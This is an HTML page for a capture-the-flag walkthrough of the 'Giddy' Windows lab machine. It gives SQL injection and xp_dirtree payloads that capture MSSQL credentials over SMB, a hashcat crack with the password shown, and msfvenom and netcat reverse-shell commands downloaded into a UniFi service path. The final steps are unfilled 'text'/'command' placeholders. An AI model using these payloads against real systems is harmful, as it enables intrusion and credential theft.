@@ -1,0 +1,227 @@
+---
+layout: default
+---
+<body class="wrap">
+  <header>
+  <div class="flexbox">
+    <nav class="main-nav hide-on-mobiles">
+      <ul>
+  <li class="">
+    <a href="/">Home</a>
+  </li>
+  <p>
+  This machine is showing only 3 open ports which basically are only 2 http/s and 3389. Usage of PowerShell web access feature is enlighted. 
+  </p>
+</ul>
+
+    </nav>
+  </div>
+</header>
+
+
+    <section class="news">
+    <div class="grid">
+
+
+
+      <div class="unit four-fifths">
+        <article>
+  <h2>
+    Access
+  </h2>
+  <span class="post-category">
+    <span class="label">
+      Walkthroughs
+    </span>
+  </span>
+  <div class="post-meta">
+    <span class="post-date">
+      16 Feb 2019
+    </span>
+  </div>
+  <p></p>
+  <div class="post-content">
+						<div class="embed-container">
+							<img src="./resources/giddy.png" />
+						</div>
+
+						<div class="embed-container">
+							<img src="./resources/diagram.png" />
+						</div>
+						
+    <p><strong>Machine: Giddy<br />
+OS: Windows<br />
+IP: 10.10.10.104</strong></p>
+<p>
+	<div>
+Initial port scan show 3 open ports: 80,443 and 3389.
+</div><p></p>
+						<div class="embed-container">
+							<img src="./resources/nmapscan.png" />
+						</div>
+</p>
+<div>
+Enumerate the website with gobuster
+<i>gobuster -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.104</i>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/gobuster.png" />
+						</div>
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/remote.png" />
+						</div>
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/mvc.png" />
+						</div>
+</p>
+<div>
+Adding a quote after Product id we gel a SQL error
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/sqlerror.png" />
+						</div>
+</p>
+<div>
+So now we know the webpage is vulnerable, we have to run sqlmap against it Very handy reading: https://www.binarytides.com/sqlmap-hacking-tutorial/ and some clear examples how to test the existence of vulnerabilities: https://www.exploit-db.com/papers/12975 
+<i>sqlmap --eizard</i>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/sqlmap.png" />
+						</div>
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/sqlmapresults.png" />
+						</div>
+</p>
+<div>
+Users existing on the machine: stacy and administrator
+
+Now I needed one hour to figure it out that I need to trick the website to spit me some credentials for connectivity.
+Handy reading resource :
+
+https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
+https://github.com/SecureAuthCorp/impacket
+
+
+It is possible to use xp_dirtree to get the Giddy MSSQL user to connect to an SMB share you host
+(using smbserver.py of Impacket) to get their credentials.
+
+
+Run this command in firefox
+<i>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC%20master.sys.xp_dirtree%20%27\\10.10.13.190\myshare%27,1,1</i>
+
+while you already lunch impacket:
+<i>smbserver.py -smb2support myshare /Impacket</i>
+
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/impacket.png" />
+						</div>
+</p>
+<div>
+Let’s crack the password with a common dictionary
+
+<i>hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt --force</i>
+
+and after a while we got the stacy password: xNnWo6272k7x
+
+maybe I can do this also with responder (my precious :))
+here is a very good resource: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/wendels-small-hacking-tricks-microsoft-sql-server-edition/
+
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/responderres.png" />
+						</div>
+</p>
+<div>
+So the easiest way is to send the request from Firefox, let’s do it this time with curl
+<i>curl 'http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;%20EXEC%20master..xp_dirtree%20%27\\10.10.13.190\foo%27;%20--'</i>
+<i>responder -I tun0 -d -r -w -v</i>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/responder.png" />
+						</div>
+</p>
+<div>
+Log into the webshell of mighty powershell
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/shell.png" />
+						</div>
+</p>
+<div>
+For root privileges (considering it’s a Windows machine we can say it administrator access)
+we see in the user folder an application called Ubiquiti UniFi. 
+check google about it and we found: https://www.exploit-db.com/exploits/43390
+</div>
+<div class="embed-container">
+							<img src="./resources/vuln.png" />
+						</div>
+<div>					
+<i>msfvenom -p windows/shell_reverse_tcp lhost=10.10.13.190 lport=9001 -f exe > nc.exe</i>
+<i>echo "nc.exe 10.10.13.190 9001 -e cmd.exe" > nc.bat</i>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/msfvenom.png" />
+						</div>
+</p>
+<div>
+Convert the nc.bat to nc.bat.exe with the following resource:
+http://www.f2ko.de/en/ob2e.php
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/ob2e.png" />
+						</div>
+</p>
+<div>
+upload exe from web powershell
+<i>wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:ProgramData\unifivideo\
+taskkill.exe"</i>
+upload nc.exe from web powershell
+<i>wget "http://10.10.14.2/nc.exe" -OutFile "C:\ProgramData\unifi-video\nc.exe"</i>
+listen local
+<i>nc -lvnp 9001</i>
+start and stop unifi from web powershell
+<i>start-service "Ubiquiti UniFi Video"</i>
+
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/nmapscan.png" />
+						</div>
+</p>
+<div>
+text
+<i>command</i>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/nmapscan.png" />
+						</div>
+</p>
+<div>
+text
+<i>command</i>
+</div>
+<p>
+</p>
+<div>
+I hope you enjoyed the write-up and didn't made you wasting time. Drop me a cup of coffee for Sundays (<a href="https://ko-fi.com/y2xhcmtrzw50"> https://ko-fi.com/y2xhcmtrzw50 </a>) or email me kryptoniteclark@protonmail.com 
+</div>
+</article>
+      </div>
+</body>
